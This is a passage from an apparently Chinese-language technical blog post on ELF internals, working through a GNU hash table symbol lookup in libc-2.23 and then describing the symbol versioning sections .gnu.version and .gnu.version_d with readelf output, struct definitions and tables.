class="line">&#125;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;这里依然使用libc6_2.23-0ubuntu11.2_amd64的libc-2.23-64.so(我重命名了)来做测试，我们随便找一个示例程序中的符号来进行测试，以“__gethostname_chk”为例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$ readelf -s libc-2.23-64.so </span><br><span class="line"></span><br><span class="line">Symbol table &apos;.dynsym&apos; contains 2245 entries:</span><br><span class="line">   Num:    Value          Size Type    Bind   Vis      Ndx Name</span><br><span class="line">     0: 0000000000000000     0 NOTYPE  LOCAL  DEFAULT  UND </span><br><span class="line">     1: 000000000001f8b0     0 SECTION LOCAL  DEFAULT   13 </span><br><span class="line">     2: 00000000003c07c0     0 SECTION LOCAL  DEFAULT   23 </span><br><span class="line">     3: 0000000000000000     0 OBJECT  GLOBAL DEFAULT  UND _rtld_global@GLIBC_PRIVATE (26)</span><br><span class="line">     4: 0000000000000000     0 OBJECT  GLOBAL DEFAULT  UND __libc_enable_secure@GLIBC_PRIVATE (26)</span><br><span class="line">     5: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND __tls_get_addr@GLIBC_2.3 (27)</span><br><span class="line">     6: 0000000000000000     0 OBJECT  GLOBAL DEFAULT  UND _rtld_global_ro@GLIBC_PRIVATE (26)</span><br><span class="line">     7: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND _dl_find_dso_for_object@GLIBC_PRIVATE (26)</span><br><span class="line">     8: 0000000000000000     0 NOTYPE  WEAK   DEFAULT  UND _dl_starting_up</span><br><span class="line">     9: 0000000000000000     0 OBJECT  GLOBAL DEFAULT  UND _dl_argv@GLIBC_PRIVATE (26)</span><br><span class="line">    10: 0000000000071100   349 FUNC    GLOBAL DEFAULT   13 putwchar@@GLIBC_2.2.5    </span><br><span class="line">    11: 000000000009ec20    32 FUNC    GLOBAL DEFAULT   13 __strspn_c1@@GLIBC_2.2.5</span><br><span class="line">    12: 00000000001187e0    16 FUNC    GLOBAL DEFAULT   13 __gethostname_chk@@GLIBC_2.4     &lt;----</span><br><span class="line">    13: 000000000009ec40    37 FUNC    GLOBAL DEFAULT   13 __strspn_c2@@GLIBC_2.2.5</span><br><span class="line">    [...]</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;从上面的输出信息中，我们可以知道动态符号表(Dynamic Symbol Table)总共有2245项，符号“__gethostname_chk”的索引为12。通过上面计算Hash的函数进行计算“__gethostname_chk”的Hash：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ ./gnu_hash __gethostname_chk</span><br><span class="line">8ADCAD37</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;要查找符号，我们需要知道.gnu.hash节的Header中的4个元素(nBuckets、Symndx、Maskwords、Shift2)，以及Bloom[]、Buckets[]、Chains[]的位置。我们将libc-2.23-64.so使用IDA打开，找到.gnu.hash节所在位置，IDA可以很好地识别.gnu.hash，结果如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">00000000000002B8 _gnu_hash       segment para public &apos;&apos; use64</span><br><span class="line">00000000000002B8                 assume cs:_gnu_hash</span><br><span class="line">00000000000002B8                 ;org 2B8h</span><br><span class="line">00000000000002B8                 assume es:nothing, ss:nothing, ds:nothing, fs:nothing, gs:nothing</span><br><span class="line">00000000000002B8 elf_gnu_hash_nbuckets dd 3F3h          ; nBuckets</span><br><span class="line">00000000000002BC elf_gnu_hash_symbias dd 0Ah            ; Symndx</span><br><span class="line">00000000000002C0 elf_gnu_hash_bitmask_nwords dd 100h    ; Maskwords</span><br><span class="line">00000000000002C4 elf_gnu_hash_shift dd 0Eh              ; Shift2</span><br><span class="line">00000000000002C8 elf_gnu_hash_indexes dq 10220A044103000h, 8C45C590E60388h, 60008405000800C4h, 4000C8A0D0080C0h; 0  ; Bloom[]</span><br><span class="line">[...]</span><br><span class="line">00000000000002C8                 dq 3EC61742383B5430h, 0A4000000A8200BF3h, 0A10CE71132329000h, 10C0449000Eh; 0B4h</span><br><span class="line">[...]</span><br><span class="line">00000000000002C8                 dq 2D0C018808080010h, 2200018216A12002h, 310060803094E008h, 483501A800183400h; 0FCh</span><br><span class="line">0000000000000AC8 elf_gnu_hash_bucket dd 0, 0Ah, 0Dh, 0Eh, 11h, 14h, 15h, 16h, 17h, 19h, 1Bh, 1Eh, 20h, 22h, 25h, 27h; 0 ; Buckets[]</span><br><span class="line">[...]</span><br><span class="line">0000000000000AC8                 dd 8BFh, 8C2h, 8C3h     ; 3F0h</span><br><span class="line">0000000000001A94 elf_gnu_hash_chain dd 1E160E72h, 0A6511920h, 8ADCAD37h, 0A6511921h; 0  ; Chains[]</span><br><span class="line">[...]</span><br><span class="line">0000000000001A94                 dd 10993873h, 949872D0h, 24B37FFBh; 8B8h</span><br><span class="line">0000000000001A94 _gnu_hash       ends</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;接下来我们需要通过Bloom Filter来验证当前对象中是否存在“__gethostname_chk”符号，首先通过计算出的Hash值得到Bloom Filter中要验证的掩码字在Bloom[]中的索引，以及改掩码字中相应的bit：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">H1 = dl_new_hash(“__gethostname_chk”) = 0x8ADCAD37</span><br><span class="line">H2 = H1 &gt;&gt; Shift2 = 0x8ADCAD37 &gt;&gt; 0xE = 0x22B72</span><br><span class="line"></span><br><span class="line">C = sizeof(BloomWord) * 8 = 8*8 = 64</span><br><span class="line">N = ((H1 / C) % Maskwords) = ((0x8ADCAD37 / 64) % 0x100) = 0x22B72B4 % 0x100 = 0x180 = 0xB4</span><br><span class="line"></span><br><span class="line">BITMASK = (1 &lt;&lt; (H1 % C)) | (1 &lt;&lt; (H2 % C)) = (1 &lt;&lt; (0x8ADCAD37 % 64)) | (1 &lt;&lt; (0x22B72 % 64))</span><br><span class="line">        = (1 &lt;&lt; 55) | (1 &lt;&lt; 50) = 0x84000000000000</span><br><span class="line"></span><br><span class="line">Bloom[N] &amp; BITMASK = Bloom[0xB4] &amp; 0x84000000000000 = 0x3EC61742383B5430 &amp; 0x84000000000000 = 0x84000000000000</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;由上面的计算可知“__gethostname_chk”对应的Bloom Filter掩码字为Bloom[0xB4]，其中的第55位和第50位都已经被设置了，说明“__gethostname_chk”可能存在于当前对象中。然后，我们通过相应的Bucket[]元素得到符号表索引/Chains[]索引：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Buckets[H1 % nBuckets] = Buckets[0x8ADCAD37 % 0x3F3] = Buckets[1] = 0xA = 10</span><br><span class="line">dynstr + dynsym[10]-&gt;st_name = “putwchar”</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;由此可知，当前符号表索引对应的符号并不是要查找的符号，我们接下来对Chain进行遍历：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Symndx = 10</span><br><span class="line">H1 &amp; ~1 = 0x8ADCAD37 &amp; 0xFFFFFFFE = 0x8ADCAD36</span><br><span class="line"></span><br><span class="line">Buckets[1](10) --&gt; Chains[10-10](0x1E160E72) --&gt; Chains[10-10+1](0xA6511920) --&gt; Chains[10-10+2](0x8ADCAD37)</span><br><span class="line">            |                         |                               |                               |     </span><br><span class="line">            ↓                         ↓                               ↓                               ↓     </span><br><span class="line">        dynsym[10]                dynsym[10]                      dynsym[10+1](不访问)             dynsym[10+2](访问)</span><br><span class="line">            |                         |                               |                               |</span><br><span class="line">            ↓                         ↓                               ↓                               ↓</span><br><span class="line">        putwchar                  putwchar                       __strspn_c1                  __gethostname_chk</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;如上可知，我们在具有相同(hash % nBuckets)的Chain中，找到最后一个，终于找到了待查找符号“__gethostname_chk”所对应的Chains[]表元素。</p><p>&emsp;&emsp;我们可以使用如下命令查看符号表中符号索引与Buckets[]数组索引的对应关系：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">$ readelf -sD libc-2.23-64.so</span><br><span class="line"></span><br><span class="line">[...]</span><br><span class="line">Symbol table of `.gnu.hash&apos; for image:</span><br><span class="line">  Num Buc:    Value          Size   Type   Bind Vis      Ndx Name</span><br><span class="line">   10   1: 0000000000071100   349 FUNC    GLOBAL DEFAULT  13 putwchar</span><br><span class="line">   11   1: 000000000009ec20    32 FUNC    GLOBAL DEFAULT  13 __strspn_c1</span><br><span class="line">   12   1: 00000000001187e0    16 FUNC    GLOBAL DEFAULT  13 __gethostname_chk</span><br><span class="line">   13   2: 000000000009ec40    37 FUNC    GLOBAL DEFAULT  13 __strspn_c2</span><br><span class="line">   14   3: 0000000000131c00   192 FUNC    GLOBAL DEFAULT  13 setrpcent</span><br><span class="line">   15   3: 00000000000b0df0    10 FUNC    GLOBAL DEFAULT  13 __wcstod_l</span><br><span class="line">   16   3: 000000000009ec70    70 FUNC    GLOBAL DEFAULT  13 __strspn_c3</span><br><span class="line">   17   4: 0000000000107a10    33 FUNC    GLOBAL DEFAULT  13 epoll_create</span><br><span class="line">   18   4: 00000000000ea940    33 FUNC    WEAK   DEFAULT  13 sched_get_priority_min</span><br><span class="line">   19   4: 00000000001187f0    16 FUNC    GLOBAL DEFAULT  13 __getdomainname_chk</span><br><span class="line">   20   5: 0000000000107c20    33 FUNC    GLOBAL DEFAULT  13 klogctl</span><br><span class="line">[...]</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;Num列为动态符号表(.dynsym)索引，Buc列为Buckets[]数组索引。我们可以看到有三个符号都与Buckets[1]相关联，这三个符号计算出的Hash值对nBucket求模，结果都是1。如前所述，此对象中不存在(hash % nBuckets)为0的符号，所以Buckets[0]为0。我们还可以看到一个规律，就是Num和Buc都是按顺序排列的，这是因为动态符号表(.dynsym)中的符号使用(hash % nBuckets)进行升序排序。这样就会使具有相同(hash % nBuckets)的动态符号表符号项和相应的Chains[]表表项在内存中是相邻的，查找符号时，我们只需要得到具有相同(hash % nBuckets)的动态符号表符号项的最小索引对应的符号项的指针，以及相应的Chain的头元素的指针，然后通过增加指针的值，就可以不用在Chains[]表中来回跳转。</p><h3 id="5-3-Version-Releated-Sections-14-15"><a href="#5-3-Version-Releated-Sections-14-15" class="headerlink" title="5.3 Version Releated Sections[^14][^15]"></a>5.3 Version Releated Sections[^14][^15]</h3><p>&emsp;&emsp;本部分介绍符号版本控制机制(Symbol Versioning Mechanism)。所有ELF对象都可能提供或依赖于版本化的符号(Versioned Symbols)。符号版本控制由3个节类型(Section Types)实现：SHT_GNU_versym(.gnu.version)、SHT_GNU_verdef(.gnu.version_d)和SHT_GNU_verneed(.gnu.version_r)。</p><p>&emsp;&emsp;动态库定义的符号版本信息保存在.gnu.version_d节，可执行程序和动态库引用其它动态库所定义的符号版本信息保存在.gnu.version_r节。</p><p>&emsp;&emsp;以下描述和代码片段中的前缀Elfxx代表“Elf32”或“Elf64”，具体取决于ELF对象运行的处理器架构。</p><p>&emsp;&emsp;版本由字符串描述。用于符号版本的结构还包含一个成员，该成员保存字符串的ELF Hash值。这允许更有效的处理。</p><p>&emsp;&emsp;符号的版本控制机制并没有被广泛应用，主要使用在GNU的C库中，用来提供符号的版本信息，以实现共享库的后向兼容。简单的说，一个符号可能有一个或多个版本的实现，多个实现在源码层次就有多段不同的代码，但在链接层次只向外提供一个相同的符号名，然后用版本信息(如@GLIBC_2.0，两个@表示默认版本)来区别不同的实现。至于程序执行时使用哪个版本的实现跟该程序在编译时所引用的版本有关。</p><p>&emsp;&emsp;.gnu.version、.gnu.version_d和.gnu.version_r等对应的节头(Section Header)中sh_link和sh_info值的意义，如下所示：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ readelf -S libc-2.23.so</span><br><span class="line"></span><br><span class="line">Section Headers:</span><br><span class="line">  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al</span><br><span class="line">  [ 0]                   NULL            00000000 000000 000000 00      0   0  0</span><br><span class="line">  [...]</span><br><span class="line">  [ 4] .dynsym           DYNSYM          00003f28 003f28 0096f0 10   A  5   1  4</span><br><span class="line">  [ 5] .dynstr           STRTAB          0000d618 00d618 005e44 00   A  0   0  1</span><br><span class="line">  [ 6] .gnu.version      VERSYM          0001345c 01345c 0012de 02   A  4   0  2</span><br><span class="line">  [ 7] .gnu.version_d    VERDEF          0001473c 01473c 0004d4 00   A  5  35  4</span><br><span class="line">  [ 8] .gnu.version_r    VERNEED         00014c10 014c10 000040 00   A  5   1  4</span><br><span class="line">  [...]</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;其中，sh_link是与此节相关联的节的索引值，如下图所示：</p><p style="text-align:center;font-weight:bold;margin:-10px 0px">Table 5-2：符号版本相关节的节头中sh_link和sh_info的含义</p><table><thead><tr><th style="text-align:left">sh_type</th><th style="text-align:left">sh_name</th><th style="text-align:left">sh_link</th><th style="text-align:left">sh_info</th></tr></thead><tbody><tr><td style="text-align:left">SHT_GNU_versym</td><td style="text-align:left">.gnu.version</td><td style="text-align:left">与此节(Section)关联的符号表(.dynsym)的节头表(Section Header Table)索引。</td><td style="text-align:left">0</td></tr><tr><td style="text-align:left">SHT_GNU_verdef</td><td style="text-align:left">.gnu.version_d</td><td style="text-align:left">与此节(Section)关联的字符串表(.dynstr)的节头表(Section Header Table)索引。</td><td style="text-align:left">本节中Elfxx_Verdef结构的数量。</td></tr><tr><td style="text-align:left">SHT_GNU_verneed</td><td style="text-align:left">.gnu.version_r</td><td style="text-align:left">与此节(Section)关联的字符串表(.dynstr)的节头表(Section Header Table)索引。</td><td style="text-align:left">本节中Elfxx_Verneed结构的数量。</td></tr></tbody></table><h4 id="5-3-1-gnu-version"><a href="#5-3-1-gnu-version" class="headerlink" title="5.3.1 .gnu.version"></a>5.3.1 .gnu.version</h4><p>&emsp;&emsp;具有SHT_GNU_versym节类型的特殊节.gnu.version应包含符号版本表(Symbol Version Table)。该节(Section)应与.dynsym节中的动态符号表(Dynamic Symbol Table)具有相同数量的条目，并且一一对应。</p><p>&emsp;&emsp;.gnu.version节应包含一个Elfxx_Versym类型的元素数组(版本信息索引表)，每个表项的长度为sizeof(Elf32_Half)，2个字节，每个条目指定为动态符号表(Dynamic Symbol Table)中的相应符号定义(Defined)或要求(Required)的版本。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Type for version symbol information.  */</span></span><br><span class="line"><span class="keyword">typedef</span> Elf32_Half Elf32_Versym;</span><br><span class="line"><span class="keyword">typedef</span> Elf64_Half Elf64_Versym;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;符号版本表(Symbol Version Table)中的值特定于它们所在的对象。这些值是由Elfxx_Vernaux结构的vna_other成员或Elfxx_Verdef结构的vd_ndx成员提供的符号版本标识符，一个索引。</p><p>值0和1被保留。</p><ul><li>0 - 该符号是局部的，在对象之外不可用。</li><li>1 - 该符号在此对象中定义并且全局可用。</li></ul><p>&emsp;&emsp;所有其他值用于标识位于其他符号版本节(Symbol Version Sections)中定义或所需的符号版本。值本身不是与符号关联的符号版本。由值标识的字符串定义了符号的版本。</p><p style="text-align:center;font-weight:bold;margin:-10px 0px">Table 5-3：符号版本表内容的一些特殊值</p><table><thead><tr><th style="text-align:left">宏名称</th><th style="text-align:center">值</th><th style="text-align:left">含义</th></tr></thead><tbody><tr><td style="text-align:left">VER_NDX_LOCAL</td><td style="text-align:center">0</td><td style="text-align:left">局部符号。</td></tr><tr><td style="text-align:left">VER_NDX_GLOBAL</td><td style="text-align:center">1</td><td style="text-align:left">全局符号。</td></tr><tr><td style="text-align:left">VER_NDX_LORESERVE</td><td style="text-align:center">0xff00</td><td style="text-align:left">保留条目的开始。</td></tr><tr><td style="text-align:left">VER_NDX_ELIMINATE</td><td style="text-align:center">0xff01</td><td style="text-align:left">被淘汰的符号。</td></tr></tbody></table><p>&emsp;&emsp;我们可以通过readelf命令查看此节的内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$ readelf -V libc-2.23.so</span><br><span class="line"></span><br><span class="line">Version symbols section &apos;.gnu.version&apos; contains 2415 entries:</span><br><span class="line"> Addr: 000000000001345c  Offset: 0x01345c  Link: 4 (.dynsym)</span><br><span class="line">  000:   0 (*local*)      24 (GLIBC_2.1)    25 (GLIBC_PRIVATE)  25 (GLIBC_PRIVATE)</span><br><span class="line">  004:   0 (*local*)      25 (GLIBC_PRIVATE)  25 (GLIBC_PRIVATE)   0 (*local*)    </span><br><span class="line">  008:  26 (GLIBC_2.3)    25 (GLIBC_PRIVATE)   7 (GLIBC_2.2)     4 (GLIBC_2.1.1)</span><br><span class="line">  00c:  11 (GLIBC_2.4)     4 (GLIBC_2.1.1)   2 (GLIBC_2.0)     3 (GLIBC_2.1)  </span><br><span class="line">  010:   4 (GLIBC_2.1.1)   e (GLIBC_2.3.2)   2 (GLIBC_2.0)    11 (GLIBC_2.4)  </span><br><span class="line">  014:   2 (GLIBC_2.0)     3 (GLIBC_2.1)     2 (GLIBC_2.0)     2 (GLIBC_2.0)  </span><br><span class="line">  018:   3 (GLIBC_2.1)     2 (GLIBC_2.0)    22 (GLIBC_PRIVATE)  22 (GLIBC_PRIVATE)</span><br><span class="line">  01c:   2 (GLIBC_2.0)     2 (GLIBC_2.0)     3 (GLIBC_2.1)     2 (GLIBC_2.0)  </span><br><span class="line">  020:   2h(GLIBC_2.0)     3 (GLIBC_2.1)    11 (GLIBC_2.4)     2h(GLIBC_2.0) </span><br><span class="line">[...]</span><br><span class="line">  960:   2 (GLIBC_2.0)     2 (GLIBC_2.0)     2 (GLIBC_2.0)     2 (GLIBC_2.0)  </span><br><span class="line">  964:   2 (GLIBC_2.0)     2 (GLIBC_2.0)     7 (GLIBC_2.2)     2 (GLIBC_2.0)  </span><br><span class="line">  968:   2 (GLIBC_2.0)    12 (GLIBC_2.5)    22 (GLIBC_PRIVATE)   3 (GLIBC_2.1)  </span><br><span class="line">  96c:   2 (GLIBC_2.0)    21 (GLIBC_2.23)    2 (GLIBC_2.0)  </span><br><span class="line">[...]</span><br></pre></td></tr></table></figure><h4 id="5-3-2-gnu-version-d"><a href="#5-3-2-gnu-version-d" class="headerlink" title="5.3.2 .gnu.version_d"></a>5.3.2 .gnu.version_d</h4><p>&emsp;&emsp;具有SHT_GNU_verdef节类型的特殊节.gnu.version_d应包含符号版本定义(Symbol Version Definitions)。本节中的条目数应包含在动态节.dynamic的节标记为DT_VERDEFNUM的条目中。</p><p>&emsp;&emsp;该节应包含一个Elfxx_Verdef结构数组，每一个Elfxx_Verdef结构，可选地后跟一个Elfxx_Verdaux结构数组。</p><p>&emsp;&emsp;.gnu.version_d节只存在于动态库文件中，表示自身所定义的符号的版本信息。</p><p>&emsp;&emsp;我们可以通过readelf命令查看此节的内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">$ readelf -V libc-2.23.so</span><br><span class="line"></span><br><span class="line">[...]</span><br><span class="line">Version definition section &apos;.gnu.version_d&apos; contains 35 entries:</span><br><span class="line">  Addr: 0x000000000001473c  Offset: 0x01473c  Link: 5 (.dynstr)  </span><br><span class="line">  000000: Rev: 1  Flags: BASE   Index: 1  Cnt: 1  Name: libc.so.6</span><br><span class="line">  0x001c: Rev: 1  Flags: none  Index: 2  Cnt: 1  Name: GLIBC_2.0</span><br><span class="line">  0x0038: Rev: 1  Flags: none  Index: 3  Cnt: 2  Name: GLIBC_2.1</span><br><span class="line">  0x0054: Parent 1: GLIBC_2.0</span><br><span class="line">  0x005c: Rev: 1  Flags: none  Index: 4  Cnt: 2  Name: GLIBC_2.1.1</span><br><span class="line">  0x0078: Parent 1: GLIBC_2.1</span><br><span class="line">  0x0080: Rev: 1  Flags: none  Index: 5  Cnt: 2  Name: GLIBC_2.1.2</span><br><span class="line">  0x009c: Parent 1: GLIBC_2.1.1</span><br><span class="line">[...]</span><br><span class="line">  0x0470: Rev: 1  Flags: none  Index: 33  Cnt: 2  Name: GLIBC_2.23</span><br><span class="line">  0x048c: Parent 1: GLIBC_2.22</span><br><span class="line">  0x0494: Rev: 1  Flags: none  Index: 34  Cnt: 2  Name: GLIBC_PRIVATE</span><br><span class="line">  0x04b0: Parent 1: GLIBC_2.23</span><br><span class="line">  0x04b8: Rev: 1  Flags: none  Index: 35  Cnt: 1  Name: GCC_3.0</span><br><span class="line">[...]</span><br></pre></td></tr></table></figure><h5 id="5-3-2-1-Elfxx-Verdef"><a href="#5-3-2-1-Elfxx-Verdef" class="headerlink" title="5.3.2.1 Elfxx_Verdef"></a>5.3.2.1 Elfxx_Verdef</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    Elf32_Half  vd_version;     <span class="comment">/* Version revision */</span></span><br><span class="line">    Elf32_Half  vd_flags;       <span class="comment">/* Version information */</span></span><br><span class="line">    Elf32_Half  vd_ndx;         <span class="comment">/* Version Index */</span></span><br><span class="line">    Elf32_Half  vd_cnt;         <span class="comment">/* Number of associated aux entries */</span></span><br><span class="line">    Elf32_Word  vd_hash;        <span class="comment">/* Version name hash value */</span></span><br><span class="line">    Elf32_Word  vd_aux;         <span class="comment">/* Offset in bytes to verdaux array */</span></span><br><span class="line">    Elf32_Word  vd_next;        <span class="comment">/* Offset in bytes to next verdef entry */</span></span><br><span class="line">&#125; Elf32_Verdef;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    Elf64_Half  vd_version;     <span class="comment">/* Version revision */</span></span><br><span class="line">    Elf64_Half  vd_flags;       <span class="comment">/* Version information */</span></span><br><span class="line">    Elf64_Half  vd_ndx;         <span class="comment">/* Version Index */</span></span><br><span class="line">    Elf64_Half  vd_cnt;         <span class="comment">/* Number of associated aux entries */</span></span><br><span class="line">    Elf64_Word  vd_hash;        <span class="comment">/* Version name hash value */</span></span><br><span class="line">    Elf64_Word  vd_aux;         <span class="comment">/* Offset in bytes to verdaux array */</span></span><br><span class="line">    Elf64_Word  vd_next;        <span class="comment">/* Offset in bytes to next verdef entry */</span></span><br><span class="line">&#125; Elf64_Verdef;</span><br></pre></td></tr></table></figure><ul><li><code>vd_version</code>：修订版本(Version Revision)。该字段应设置为1。</li><li><code>vd_flags</code>：版本信息标志(Version Information Flag)位掩码。一般为0。</li><li><code>vd_ndx</code>：节类型为SHT_GNU_versym的节(.gnu.version)中引用的符号版本的标识符，一个索引值。与Elfxx_Vernaux结构中的vna_other含义差不多。将.gnu.version表条目与相应的版本定义相关联。</li><li><code>vd_cnt</code>：与此符号版本定义相关联的Elfxx_Verdaux结构数组条目的数量。同一符号可能有多个版本。</li><li><code>vd_hash</code>：版本名称哈希值(用ELF Hash函数计算)。与此符号版本定义相关联的Elfxx_Verdaux结构数组的第一个Elfxx_Verdaux之中的vda_name对应的版本名称的哈希值。</li><li><code>vd_aux</code>：Elfxx_Verdaux结构数组中第1个条目距当前Elfxx_Verdef结构起始的字节偏移量(一般为Elfxx_Verdef结构的字节大小)。Elfxx_Verdaux结构数组的第一个条目必须存在。此条目(Elfxx_Verdaux)包含指向此结构(Elfxx_Verdef)定义的符号版本的版本字符串。可以存在附加条目(Elfxx_Verdaux)。条目的数量由vd_cnt值给出。这些条目代表此符号版本定义(Elfxx_Verdef)的依赖关系。这些依赖项中的每一个都有自己的符号版本定义结构(Elfxx_Verdef)。</li><li><code>vd_next</code>：下一个Elfxx_Verdef结构距当前Elfxx_Verdef结构起始的偏移量(Elfxx_Verdef结构大小+vd_cnt个Elfxx_Verdaux的大小)，以字节为单位。0表示当前Elfxx_Verdef结构为最后1个。</li></ul><p style="text-align:center;font-weight:bold;margin:-10px 0px">Table 5-4：合法的vd_version值</p><table><thead><tr><th style="text-align:left">宏名称</th><th style="text-align:center">值</th><th style="text-align:left">含义</th></tr></thead><tbody><tr><td style="text-align:left">VER_DEF_NONE</td><td style="text-align:center">0</td><td style="text-align:left">无版本。</td></tr><tr><td style="text-align:left">VER_DEF_CURRENT</td><td style="text-align:center">1</td><td style="text-align:left">当前版本。</td></tr><tr><td style="text-align:left">VER_DEF_NUM</td><td style="text-align:center">2</td><td style="text-align:left">给定版本号。</td></tr></tbody></table><p style="text-align:center;font-weight:bold;margin:-10px 0px">Table 5-5：合法的vd_flags值</p><table><thead><tr><th style="text-align:left">宏名称</th><th style="text-align:center">值</th><th style="text-align:left">含义</th></tr></thead><tbody><tr><td style="text-align:left">VER_FLG_BASE</td><td style="text-align:center">0x1</td><td style="text-align:left">文件本身的版本定义。</td></tr><tr><td style="text-align:left">VER_FLG_WEAK</td><td style="text-align:center">0x2</td><td style="text-align:left">弱版本标识符。</td></tr></tbody></table><p>&emsp;&emsp;当符号版本定义(Version Definitions)或符号自动缩减(Symbol Autoreduction)已应用于文件时，基本符号版本定义(Base Version Definition)始终存在。基本符号版本(Base Version)为文件保留符号提供了默认符号版本。弱符号版本定义(Weak Version Definition)没有与符号版本关联的符号。</p><h5 id="5-3-2-2-Elfxx-Verdaux"><a href="#5-3-2-2-Elfxx-Verdaux" class="headerlink" title="5.3.2.2 Elfxx_Verdaux"></a>5.3.2.2 Elfxx_Verdaux</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    Elf32_Word    vda_name;       <span class="comment">/* Version or dependency names */</span></span><br><span class="line">    Elf32_Word    vda_next;       <span class="comment">/* Offset in bytes to next verdaux entry */</span></span><br><span class="line">&#125; Elf32_Verdaux;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    Elf64_Word    vda_name;       <span class="comment">/* Version or dependency names */</span></span><br><span class="line">    Elf64_Word    vda_next;       <span class="comment">/* Offset in bytes 